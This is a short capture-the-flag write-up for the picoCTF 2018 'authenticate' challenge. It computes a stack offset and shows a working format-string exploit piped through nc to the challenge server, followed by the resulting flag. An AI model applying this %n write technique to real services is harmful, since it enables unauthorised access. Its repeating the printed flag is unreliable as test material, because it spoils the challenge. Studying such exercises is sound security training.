> authenticate - Points: 350 - (Solves: 153)
> Can you authenticate to this service and get the flag? Connect with nc 2018shell1.picoctf.com 52398. Source.

Authenticated variable address: `0x0804A04C`

buffer location before fgets:
0xffffd550 - 0xffffd57c = 44
44 / 4 = 11

We can now craft our payload
```
% (python -c "print '\x4c\xA0\x04\x08' + '%11\$n'") | nc 2018shell1.picoctf.com 52398
Would you like to read the flag? (yes/no)
Received Unknown Input:

L
Access Granted.
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}
```

Flag: `picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}`
